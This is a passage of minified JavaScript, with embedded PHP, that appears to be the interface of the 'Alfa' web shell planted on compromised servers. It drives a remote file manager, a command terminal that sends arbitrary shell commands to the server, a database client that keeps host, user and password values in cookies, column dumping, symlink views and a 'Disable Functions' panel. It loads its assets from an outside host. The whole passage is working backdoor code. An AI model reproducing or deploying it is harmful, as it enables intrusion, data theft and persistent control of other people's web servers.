0!==t?(a="view_archive",i=e,l=location):(a=e.name,i=e.getAttribute("fname"),l=e),"extract"==a?(alfa_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=deziper",g("deziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="DeCompressor"):"compress"==a?(alfa_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=ziper",g("ziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="Compressor"):"view_archive"==a&&(alfa_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=archive_manager",g("archive_manager",null,"",c_+"/"+i,""),d.querySelector(".opt-title").innerHTML="Archive Manager")}function doFilterName(e){var t="#filesman_holder_"+alfa_current_fm_id;setTimeout(function(){var a=new RegExp(e.value,"i");d.querySelectorAll(t+" .fmanager-row").forEach(function(e){-1==e.querySelector(".main_name").getAttribute("fname").search(a)?e.style.display="none":e.style.display="table-row"})},100)}function sortBySelectedValue(e,t){setCookie(t,e.options[e.selectedIndex].value,2012),g("FilesMan",c_)}function loadPopUpDatabase(e,t,a){if(console.log(t),$("database_window").style.display="block",void 0===t){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}try{d.querySelector(".sql-tabs .sql-newtab").remove()}catch(e){}var i="id_db_"+getRandom(10);d.querySelector("#database_window .content_options_holder .sql-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="sql-content sql-active-content">'+e+"</div>"),d.querySelector("#database_window .content_options_holder .sql-tabs").insertAdjacentHTML("beforeend",'<div id="tab_'+i+'" opt_id="'+i+'" class="sql-tabname sql-active-tab" onclick="dbTabController(this);"><span style="font-weight:unset;">New DB Connection</span> <img opt_id="'+i+'" onclick="closeDatabase(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div><div class="sql-newtab" onclick="alfa_can_add_opt=true;g(\'sql\',null,\'\',\'\',\'\');" style="background-color:#800000;"><span style="font-weight:unset;">New Tab +</span></div>'),$(i).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",i)});try{$(i).querySelector(".getconfig").setAttribute("base_id",i)}catch(e){}return i}$(t).innerHTML=e;var l=$("tab_"+t);null!=l&&((-1==l.classList.value.indexOf("sql-active-tab")||database_window_is_minimized)&&(l.classList.add("tab-is-done"),alfaShowNotification("proccess is done...","DB: "+l.innerText)),database_window_is_minimized&&alfaUpdateOptionsBadge("database_window")),void 0!==mysql_cache[t]&&mysql_cache[t].hasOwnProperty("db")&&mysql_cache[t].db.length>0&&"update"!=a&&(d.querySelector("#tab_"+t+">span").innerHTML=mysql_cache[t].db),$(t).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",t)});try{$(t).querySelector(".getconfig").setAttribute("base_id",t)}catch(e){}database_window_is_minimized||(d.body.style.overflow="hidden")}function loadPopUpOpTions(e,t){console.log(e),alfa_before_do_action_id="",$("options_window").style.display="block";var a=$("option_"+e);if(alfa_can_add_opt){alfa_can_add_opt=!1;try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var i="",l=$("menu_opt_"+e).innerHTML;"market"==e?l="Alfa Market":"GetDisFunc"==e&&(l="Disable Functions");try{d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}if(null!=a){var r=a.getAttribute("opt_count");null!=r?(i=parseInt(r)+1,a.setAttribute("opt_count",i)):(i=1,a.setAttribute("opt_count",i))}var o="option_"+e+i;d.querySelector("#options_window .content_options_holder .options_content").insertAdjacentHTML("afterbegin",'<div id="'+o+'" class="options_holder">'+t+"</div>"),d.querySelector("#options_window .content_options_holder .options_tab").insertAdjacentHTML("beforeend",'<div opt_id="'+o+'" onclick="optionsTabController(this);" title="'+l+'" id="tab_'+o+'" class="tab_name tab_is_active">'+l+' <img opt_id="'+o+'" onclick="closeOption(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),$(o).classList.toggle("option_is_active"),d.querySelectorAll("#"+o+" form, #"+o+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var l=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'alfaBeforeDoAction("'+e+i+'");'+l),t.setAttribute("opt_id",e+i)}else{l=t.getAttribute("onclick");t.setAttribute("onclick",'alfaBeforeDoAction("'+e+i+'");'+l)}});try{$(o).querySelector(".getconfig").setAttribute("base_id",e+i)}catch(e){}return e+i}a.innerHTML=t;var n=$("tab_option_"+e);null!=n&&((-1==n.classList.value.indexOf("tab_is_active")||options_window_is_minimized)&&(n.classList.add("tab-is-done"),alfaShowNotification("proccess is done...",n.innerText)),options_window_is_minimized&&alfaUpdateOptionsBadge("options_window")),d.querySelectorAll("#option_"+e+" form, #option_"+e+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var i=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'alfaBeforeDoAction("'+e+'");'+i),t.setAttribute("opt_id",e)}else{i=t.getAttribute("onclick");t.setAttribute("onclick",'alfaBeforeDoAction("'+e+'");'+i)}});try{a.querySelector(".getconfig").setAttribute("base_id",e)}catch(e){}options_window_is_minimized||(d.body.style.overflow="hidden")}function alfaBeforeDoAction(e){alfa_before_do_action_id=e}function alfaLoaderOnTop(e){$("a_loader").style.display=e,d.body.style.overflow="block"==e?"hidden":"visible"}function alfaAjaxController(e){var t=e.getAttribute("parent");$("loader_"+t).remove(),"filesman_holder"==t.substr(0,15)&&($(t).style.minHeight="0"),_ALFA_AJAX_.hasOwnProperty(t)&&_ALFA_AJAX_[t].abort()}function closeDatabase(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("sql-active-tab"))if((e=d.querySelectorAll(".sql-tabs .sql-tabname")).length>1){e[0].classList.add("sql-active-tab");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("sql-active-content")}else editorClose("database_window");d.querySelector("div[opt_id="+a+"]").remove()}function closeFmTab(e,t){t.stopPropagation();var a=e.getAttribute("fm_id"),i=$("filesman_tab_"+a);if(-1!=i.classList.value.indexOf("filesman-tab-active")&&(e=d.querySelectorAll("#filesman_tabs .filesman_tab")).length>1){e[0].classList.add("filesman-tab-active");var l=e[0].getAttribute("fm_id"),r="filesman_holder_"+l;if(null!=$(r)){$(r).classList.toggle("filesman-active-content");var o=$("filesman_tab_"+l).getAttribute("path");initDir(o),d.mf.c.value=o,alfa_current_fm_id=l}}i.remove(),$("filesman_holder_"+a).remove(),alfaFilesmanTabHideTitle()}function closeOption(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("tab_is_active"))if((e=d.querySelectorAll(".options_tab .tab_name")).length>1){e[0].classList.add("tab_is_active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("option_is_active")}else editorClose("options_window");d.querySelector("div[opt_id="+a+"]").remove()}function historyPanelController(e){"hidden"==e.getAttribute("mode")?(d.querySelector(".editor-explorer").style.display="block",d.querySelector(".editor-modal").style.marginLeft="20%",e.setAttribute("mode","visible"),e.style.left="19%",e.innerHTML="<<"):(d.querySelector(".editor-explorer").style.display="none",d.querySelector(".editor-modal").style.marginLeft="1%",e.setAttribute("mode","hidden"),e.style.left="0%",e.innerHTML=">>")}function closeTerminalContent(e,t){t.stopPropagation();var a=e.getAttribute("term_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("active-terminal-tab"))&&(e=d.querySelectorAll(".terminal-tabs .terminal-tab")).length>1){e[0].classList.add("active-terminal-tab");var i=e[0].getAttribute("term_id");null!=$(i)&&$(i).classList.toggle("active-terminal-content")}d.querySelector("div[term_id="+a+"]").remove()}function closeEditorContent(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("editor-tab-active"))&&(e=d.querySelectorAll(".editor-tabs .editor-tab-name")).length>1){e[0].classList.add("editor-tab-active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("editor-content-active")}d.querySelector("div[opt_id="+a+"]").remove()}function optionsTabController(e){try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("option_is_active");try{d.querySelector("#options_window .content_options_holder .options_tab \t.tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("tab_is_active"),d.querySelector(".opt-title").innerHTML=e.getAttribute("title"),alfaUpdateOptionsBadge("options_window")}function terminalTabController(e){try{d.querySelector(".terminal-tab.active-terminal-tab").classList.remove("active-terminal-tab")}catch(e){}try{d.querySelector(".terminal-content.active-terminal-content").classList.remove("active-terminal-content")}catch(e){}var t=e.getAttribute("term_id");if(null==t)return!1;$(t).classList.toggle("active-terminal-content"),e.classList.remove("tab-is-done"),e.classList.add("active-terminal-tab"),$(t).querySelector(".php-terminal-input").focus(),alfaUpdateOptionsBadge("cgiloader")}function filesmanTabController(e){try{d.querySelector(".ajaxarea.filesman-active-content").classList.remove("filesman-active-content")}catch(e){}try{d.querySelector(".filesman_tab.filesman-tab-active").classList.remove("filesman-tab-active")}catch(e){}var t=e.getAttribute("fm_id");if(null==t)return!1;alfa_current_fm_id=t,e.classList.add("filesman-tab-active"),e.classList.remove("tab-is-done"),$("filesman_holder_"+t).classList.toggle("filesman-active-content");var a=e.getAttribute("path");initDir(a),d.mf.c.value=a}function dbTabController(e){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("sql-active-content"),e.classList.remove("tab-is-done"),e.classList.add("sql-active-tab"),alfaUpdateOptionsBadge("database_window")}function editorTabController(e,t){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}var a=null;void 0===t?a=e.getAttribute("opt_id"):(a=e,e=$("tab_"+a));var i=editor_files["file_"+a.replace("editor_source_","")];if(void 0!==i&&(d.querySelector(".editor-path").innerHTML=(i.pwd+"/"+i.file).replace(/\/\//g,"/")),null==a)return!1;$(a).classList.toggle("editor-content-active");try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("editor-tab-active"),alfaUpdateOptionsBadge("editor")}function alfaUpdateOptionsBadge(e){var t=d.querySelector("#"+e+"-minimized .options_min_badge");if(null!=t){var a=d.querySelectorAll("#"+e+" .tab-is-done").length;t.innerHTML=a,t.style.visibility=a>0?"visible":"hidden"}}function alfaOpenPhpTerminal(e){if(php_temrinal_using_cgi&&void 0===e)showEditor("cgiloader");else{$("cgiloader").style.display="block",$("cgiloader").style.background="rgba(0, 0, 0, 0.57)",$("cgiframe").style.background="rgba(0, 0, 0, 0.81)",$("cgiframe").style.border="1px solid rgb(30, 86, 115)",$("cgiframe").style.height="90%",$("cgiframe").style.padding="3px",d.querySelector("#cgiloader .opt-title").innerHTML="Terminal";var t="",a="",i="terminal_id_"+getRandom(10);void 0===e&&(t=" active-terminal-content",a=" active-terminal-tab"),d.querySelector("#cgiframe .terminal-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="terminal-content'+t+'"><div class="php-terminal-output"><div><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+'\',1);">+</button><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+"',0);\">-</button><input onchange=\"alfaTerminalChangecolor(this,'"+i+'\');" style="height: 18px;background: #dde2e2;" type="color"></div><pre class="ml1" style="border:unset;height: 90%;"></pre></div><div><form term_id="'+i+'" onSubmit="alfaExecTerminal(this);this.c.value=\'\';return false;" autocomplete="off" style="margin-top: 10px;"><div style="overflow: auto;white-space: nowrap;"><div style="display: inline-block;color:#4fbec3;margin-bottom:5px;margin-right:5px;">CWD:~# </div><div style="display: inline-block;color:#42ec42;" class="php-terminal-current-dir"></div></div><div style="position:relative;"><span style="color: #00ff08;font-size: 25px;">$ </span><input style="padding: 8px;font-size: 20px;width: 67%;border: 1px solid #27979B;padding-right:35px;" onkeyup="alfaWalkInTerminalHistory(this,event,\''+i+'\');" term_id="'+i+'" class="php-terminal-input" type="text" name="c" onfocus="closeHistoryCmd(\'free\',this);" placeholder="ls -la"><button class="button" style="color: #27979B;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;">ExeCute<button term_id="'+i+'" class="button" style="color: #27979B;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;" onClick="alfaExecTerminal(this, 1);return false;">Current Dir</button><div class="cmd-history-holder"><div class="commands-history-header">History</div><span onClick="clearTerminalHistory();" style="border-bottom: 1px solid;margin-bottom: 5px;display: inline-block;padding: 5px;color: #59de69;cursor: pointer;">Clear history</span><div style="overflow: auto;height: 82%;" class="commands-history"></div></div><div term_id="'+i+'" class="cmd-history-icon" mode="" onclick="closeHistoryCmd(this);"><img style="width:27px;" src="http://solevisible.com/icons/menu/time2.svg"></div></form></div></div></div>');try{$("terminal_new_tab").remove()}catch(e){}d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="terminalTabController(this);" term_id="'+i+'" id="tab_'+i+'" class="terminal-tab'+a+'">Terminal <img term_id="'+i+'" onclick="closeTerminalContent(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="alfaOpenPhpTerminal(true);" id="terminal_new_tab" style="background-color:#800000;" class="terminal-tab">New Tab +</div>'),terminal_walk_index[i]={index:0,key:-1},d.querySelector("#"+i+" .php-terminal-input").focus(),d.querySelector("#"+i+" .php-terminal-current-dir").innerHTML=c_,d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Terminal",alfaTerminalSetColorAndSize(i),php_temrinal_using_cgi=!0;var l=alfaGetTerminalHistory();for(var r in l)d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+l[r]+"</div>")}d.body.style.overflow="hidden"}function alfaTerminalSetColorAndSize(e){var t=getCookie("alfa-terminal-color"),a=getCookie("alfa-terminal-fontsize");void 0!==t&&(d.querySelector("#"+e+" pre.ml1").style.color=t),void 0!==a&&(d.querySelector("#"+e+" pre.ml1").style.fontSize=a)}function alfaTerminalChangecolor(e,t){d.querySelector("#"+t+" pre.ml1").style.color=e.value,setCookie("alfa-terminal-color",e.value,2012)}function alfaGetTerminalHistory(e){var t=getCookie("alfa-terminal-history");try{t=atob(t),t=JSON.parse(t)}catch(e){t=[]}return void 0!==e&&t.reverse(),t}function changeTerminalFontSize(e,t){var a=d.querySelector("#"+e+" pre.ml1"),i=parseInt(window.getComputedStyle(a,null).getPropertyValue("font-size")),l="";1==t?(l=i+1+"px",a.style.fontSize=l):(l=i-1+"px",a.style.fontSize=l),setCookie("alfa-terminal-fontsize",l,2012)}function alfaWalkInTerminalHistory(e,t,a){var i=t||window.event;if("38"==i.keyCode||"40"==i.keyCode||"37"==i.keyCode||"39"==i.keyCode)switch(i.keyCode){case 38:var l=alfaGetTerminalHistory(!0),r="";0==terminal_walk_index[a].index?(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,void 0!==(r=l[terminal_walk_index[a].index])?(e.value=r,++terminal_walk_index[a].index):(e.value="",terminal_walk_index[a].index=0)):terminal_walk_index[a].index<l.length&&(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,e.value=l[terminal_walk_index[a].index],++terminal_walk_index[a].index),terminal_walk_index[a].key=1;break;case 40:l=alfaGetTerminalHistory(!0);if(terminal_walk_index[a].index>=0)0!=terminal_walk_index[a].index&&(--terminal_walk_index[a].index,1==terminal_walk_index[a].key&&--terminal_walk_index[a].index),void 0!==(r=l[terminal_walk_index[a].index])?e.value=r:(e.value="",terminal_walk_index[a].index=0);terminal_walk_index[a].key=0;break;default:console.log(i.keyCode)}else terminal_walk_index[a].index=0}function clearTerminalHistory(){d.querySelectorAll(".commands-history").forEach(function(e){e.innerHTML=""}),setCookie("alfa-terminal-history","",2012)}function alfaAceToFullscreen(e){var t=e.getAttribute("ace_id");alfa_ace_editors.editor[t].container.requestFullscreen()}function closeHistoryCmd(e,t){if("free"==e){var a=t.getAttribute("term_id");return e=d.querySelector("#"+a+" .cmd-history-icon"),d.querySelector("#"+a+" .cmd-history-holder").style.visibility="hidden",d.querySelector("#"+a+" .cmd-history-holder").style.opacity="0",e.setAttribute("mode","off"),!1}var i=e.getAttribute("mode"),l=(a=e.getAttribute("term_id"),d.querySelector("#"+a+" .cmd-history-holder"));0==i.length||"off"==i?(l.style.visibility="visible",l.style.opacity="1",e.setAttribute("mode","on")):(l.style.visibility="hidden",l.style.opacity="0",e.setAttribute("mode","off"))}function geEvalAceValue(e){var t=e.querySelector(".php-evals-ace").getAttribute("id");return alfa_ace_editors.eval[t].getValue()}function alfaOpenArchive(e){var t=e.getAttribute("path"),a=e.getAttribute("fname"),i=e.getAttribute("base_id");if(".."==a&&"phar://"!=t.substr(0,7))return!1;var l="a="+alfab64("open_archive_dir")+"&c="+alfab64(c_)+"&alfa1="+alfab64(t)+"&alfa2="+alfab64(i)+"&ajax="+alfab64("true");_Ajax(d.URL,l,function(e){if("0"!=e){$("archive_base_"+i).innerHTML=e;var a=$("archive_dir_"+i).getAttribute("archive_name"),l=$("archive_dir_"+i).getAttribute("archive_full"),r="",o="";if(0!=(t=t.split(a)[1]).length){var n=(t=t.split("/")).length-1;for(var s in 0==t[n].length&&t.splice(n,1),t)0!=t.length&&(o+=t[s]+"/",r+='<a base_id="'+i+'" fname="'+t[s]+'" path="'+l+o+'" onclick="alfaOpenArchive(this);">'+t[s]+"/</a>")}d.querySelector("#archive_dir_"+i+" .archive_pwd_holder").innerHTML=r}},!1,"open_archive_dir")}function alfaDeleteConnectToDb(e){d.querySelectorAll(".dbh_"+e).forEach(function(e){e.remove()}),alfaConnectionHistoryUpdate(e)}function alfaConnectToDb(e,t){var a={};try{a=JSON.parse(atob(getCookie("alfa_connection_hist")))}catch(e){}var i=d.querySelector("#"+t+" div.sf");i.querySelector("input[name=sql_host]").value=a[e].host,i.querySelector("input[name=sql_login]").value=a[e].user,i.querySelector("input[name=sql_pass]").value=a[e].pass,(i.querySelector("input[name=sql_base]")?i.querySelector("input[name=sql_base]"):i.querySelector("select[name=sql_base]")).value=a[e].db,i.querySelector("input[name=sql_count]").checked=!0,d.querySelector("#"+t+" div.sf .db-connect-btn").click()}function alfaShowConnectionHistory(e){var t={},a=e.getAttribute("db_id"),i=e.getAttribute("mode");if(rows='<table class="connection-hist-table"><tr><th>*</th><th>Host</th><th>User</th><th>Pass</th><th>Database</th><th>Connect</th><th>Delete</th></tr>',"on"==i){e.setAttribute("mode","off");try{t=JSON.parse(atob(getCookie("alfa_connection_hist")))}catch(e){}var l,r=1;for(l in t){var o=t[l].user+"_"+t[l].db;rows+='<tr class="dbh_'+o+'"><th>'+r+"</th><th>"+t[l].host+"</th><th>"+t[l].user+"</th><th>"+t[l].pass+"</th><th>"+t[l].db+'</th><th><button style="margin: unset;" class="connection-his-btn" onclick=\'alfaConnectToDb("'+o+'","'+a+'");\'>Connect</button></th><th style="text-align: center;"><button style="margin: unset;" class="connection-his-btn connection-delete" onclick=\'alfaDeleteConnectToDb("'+o+"\");'>X</button></th></tr>",r++}rows+="</table"}else e.setAttribute("mode","on"),rows="";d.querySelector("#"+a+" .connection_history_holder").innerHTML=rows}function alfaConnectionHistoryUpdate(e){var t,a={};try{a=JSON.parse(atob(getCookie("alfa_connection_hist")))}catch(e){}for(t in mysql_cache)0!=mysql_cache[t].db.length&&(a[mysql_cache[t].user+"_"+mysql_cache[t].db]=mysql_cache[t]);void 0!==e&&delete a[e],setCookie("alfa_connection_hist",btoa(JSON.stringify(a)),2012)}function alfaExecTerminal(e,t){var a="";if(0==(a=void 0!==t?"cd "+c_:e.c.value).length)return!1;"l"==a?a="ls -trh --color":"ll"==a&&(a="ls -ltrh --color");var i=e.getAttribute("term_id");alfaloader(i,"block"),closeHistoryCmd("free",e);var l="";"FORM"==e.tagName&&(l=e.querySelector(".php-terminal-current-dir").innerHTML),0==(l=l.trim()).length&&(l=c_);var r="a="+alfab64("terminalExec")+"&c="+alfab64(l)+"&alfa1="+alfab64(a)+"&ajax="+alfab64("true");if(_Ajax(d.URL,r,function(e,t){alfaloader(t,"none");try{var a=$("tab_"+i);null!=a&&((-1==a.classList.value.indexOf("active-terminal-tab")||cgi_is_minimized)&&(a.classList.add("tab-is-done"),alfaShowNotification("proccess is done...",a.innerText)),cgi_is_minimized&&alfaUpdateOptionsBadge("cgiloader"))}catch(e){}e=JSON.parse(e),d.querySelector("#"+t+" .php-terminal-output > pre").innerHTML=e.output,0!=e.path.length&&(d.querySelector("#"+t+" .php-terminal-current-dir").innerHTML=e.path)},!1,i),void 0===t){d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+a+"</div>");var o=alfaGetTerminalHistory(),n=o.indexOf(a);-1!=n&&o.splice(n,1),o.push(a),setCookie("alfa-terminal-history",btoa(JSON.stringify(o)),2012)}d.querySelector("#"+i+" input.php-terminal-input").focus()}function pageChangedFilesMan(e){var t="filesman_holder_"+alfa_current_fm_id,a=getCookie(t+"_page_number"),i=e.innerText;if("<<"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;if(!((a=parseInt(a))>1))return!1;i=a-1}if(">>"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;a=parseInt(a);var l=d.querySelector("#"+t+" .last-page-number").innerHTML;if(!(a+1<=(l=parseInt(l))))return!1;i=a+1}setCookie(t+"_page_number",i,2012),g("FilesMan",c_)}function alfaColDumperInit(){var e=d.querySelector(".tab_name.tab_is_active").getAttribute("opt_id"),t=d.querySelector("#"+e),a=t.getElementsByClassName("box");for(i=0;i<a.length;i++)a[i].addEventListener("click",function(){null!=this.parentElement.querySelector(".nested")&&(this.parentElement.querySelector(".nested").classList.toggle("active"),this.classList.toggle("check-box"))});var i;a=t.getElementsByClassName("sub-box");for(i=0;i<a.length;i++)a[i].setAttribute("opt_id",e),a[i].addEventListener("click",function(){this.classList.toggle("check-box");var e=this.getAttribute("tbl"),t=this.getAttribute("opt_id");t=t.replace("option_",""),col_dumper_selected_data.hasOwnProperty(t)||(col_dumper_selected_data[t]={}),void 0===col_dumper_selected_data[t][e]&&(col_dumper_selected_data[t][e]=[]);var a=this.innerHTML,i=col_dumper_selected_data[t][e].indexOf(a);-1==i?col_dumper_selected_data[t][e].push(a):col_dumper_selected_data[t][e].splice(i,1)})}function showSymlinkPath(e,t){t.stopPropagation();var a=e.getAttribute("row"),i=$("td_row_"+a),l=e.getAttribute("opt_title"),r=e.getAttribute("fname");if(l=decodeURIComponent(r)+" -> "+l,null!=i){i.insertAdjacentHTML("afterbegin",'<div class="symlink_path" id="link_id_'+a+'">'+l+"</div>");var o=t.clientX,n=t.clientY-30;$("link_id_"+a).style.left=o+"px",$("link_id_"+a).style.top=n+"px"}}function hideSymlinkPath(e,t){t.stopPropagation(),$("link_id_"+e.getAttribute("row")).remove()}function alfagetFlags(){data="a="+alfab64("get_flags")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),_Ajax(d.URL,data,function(e){var t=JSON.parse(e);t.hasOwnProperty("server")&&(d.querySelectorAll(".flag-holder")[0].innerHTML='<img draggable="false" title="'+t.server.name+'" src="http://solevisible.com/images/flags/48/'+t.server.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[0].style.display="inline"),t.hasOwnProperty("client")&&(d.querySelectorAll(".flag-holder")[1].innerHTML='<img draggable="false" title="'+t.client.name+'" src="http://solevisible.com/images/flags/48/'+t.client.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[1].style.display="inline")})}function colDumplerSelectType(e){var t=e.options[e.selectedIndex].value;$("coldumper-delimiter-input").style.display="delimiter"==t?"inline-block":"none"}function alfaCheckUrlHash(){var e=window.location.hash.substr(1),t=e.split("&").reduce(function(e,t){var a=t.split("=");return e[a[0]]=a[1],e},{});if(""!=e)switch(t.action){case"fileman":case"options":t.path=decodeURIComponent(t.path),g("FilesMan",t.path,function(e){if(t.hasOwnProperty("file")){var a="auto";isArchive(t.file)&&(a="view"),editor(t.path+"/"+t.file,a,"","","","file")}}),"options"==t.action&&t.hasOwnProperty("opt")&&(alfa_can_add_opt=!0,g(t.opt,null,"","",""),d.querySelector(".opt-title").innerHTML=$("menu_opt_"+t.opt).innerHTML),t.hasOwnProperty("file")||editorClose("editor"),t.hasOwnProperty("opt")||editorClose("options_window"),editorClose("cgiloader");break;default:g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}else g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}function alfaFmngrContextRow(){d.querySelectorAll(".fmanager-row a.main_name").forEach(function(e){e.addEventListener("contextmenu",function(e){var t=e.target,a="";if(".."==(a="A"==e.target.parentElement.tagName?(t=e.target.parentElement).getAttribute("fname"):t.getAttribute("fname")))return!1;var i=t.getAttribute("id"),l=t.getAttribute("path"),r=t.getAttribute("ftype"),o=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete"];for(var n in"file"!=r||isArchive(a)?o[3]="view_archive":o.splice(11,1),"folder"==r&&(o=["newtab","link","move","copy","rename","modify","permission","compress","delete"]),alfaSortMenuItems(o),o){var s=d.querySelector("#rightclick_menu > a[name="+o[n]+"]");switch(s.setAttribute("fid",i),s.setAttribute("fname",decodeURIComponent(a)),s.setAttribute("path",l),s.setAttribute("ftype",r),o[n]){case"view":case"edit":var c="auto";"edit"==o[n]&&(c="edit"),s.setAttribute("href","#action=fileman&path="+c_+"/&file="+a),s.setAttribute("onclick","editor('"+a+"','"+c+"','','','','file')");break;case"newtab":var u=a;"file"==r?(u="&file="+a,s.setAttribute("href","#action=fileman&path="+c_+"/"+u),s.setAttribute("target","_blank"),s.onclick=function(){}):(s.setAttribute("href","javascript:void(0)"),s.removeAttribute("target"),s.onclick=function(){alfaFilesManNewTab(c_,u)});break;case"delete":s.setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';");break;case"download":s.setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')");break;case"permission":try{var p=d.querySelector("#id_chmode_"+i.replace("id_","")+" span").innerHTML;s.setAttribute("perm",p.trim())}catch(e){}break;case"link":s.style.display="block";var f="<?php echo $_SERVER["DOCUMENT_ROOT"]; ?>/",m=(c_+"/"+a).replace(/\/\//g,"/");if(-1!=m.indexOf(f)){f=m.replace(f,"");var b=location.origin+"/"+f;s.setAttribute("href",""+b)}else s.style.display="none"}}var y=e.clientX,_=e.clientY;alfaRightClickMenu(y,_),e.preventDefault()})})}function alfaFilesManNewTab(e,t,a){var i=t;void 0!==a&&(i=alfaGetLastFolderName(e));var l=decodeURIComponent(e+"/"+t);l=l.replace(/\/\//g,"/");var r=$("filesman_tab_1"),o=r.getAttribute("fm_counter");o=parseInt(o)+1,r.setAttribute("fm_counter",o),d.querySelector("#filesman_tabs_child").insertAdjacentHTML("beforeend",'<div onmouseover="alfaFilesmanTabShowTitle(this,event);" onmouseout="alfaFilesmanTabHideTitle(this,event);" path="'+l+'" id="filesman_tab_'+o+'" fm_id="'+o+'" onclick="filesmanTabController(this);" fname="'+t+'" class="filesman_tab"><img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span class="filesman-tab-folder-name">'+i+'</span> <img fm_id="'+o+'" onclick="closeFmTab(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),d.querySelector(".ajaxarea").insertAdjacentHTML("beforebegin",'<div style="position:relative;" fm_id="'+o+'" id="filesman_holder_'+o+'" class="ajaxarea"><div class="header"></div></div>'),alfa_fm_id=o,g("FilesMan",l),alfa_fm_id=0}function alfaFilesmanTabShowTitle(e,t){t.stopPropagation();var a=$("filesman-tab-full-path");a.style.display="block",a.style.top=e.offsetTop-37+"px",a.style.left=e.offsetLeft-$("filesman_tabs").scrollLeft+"px",a.innerHTML=e.getAttribute("path")}function alfaFilesmanTabHideTitle(e,t){$("filesman-tab-full-path").style.display="none"}function alfaPopupAction(e,t){var a="",i="";switch(t){case"rename":a="Old file name:",i="New file name:";break;case"copy":a="File path:",i="Enter the file path that you want to copy this file to:";break;case"move":a="Current Path:",i="Enter the file path that you want to move this file to:";break;case"extract":a="Files to extract:",i="Enter the path you wish to extract the files to and click Extract:"}var l=e.getAttribute("fname"),r=e.getAttribute("path"),o=t.charAt(0).toUpperCase()+t.slice(1);if("permission"==t){d.querySelector("#shortcutMenu-holder").style.height="222px",o="Change Permissions",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="block",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="none";var 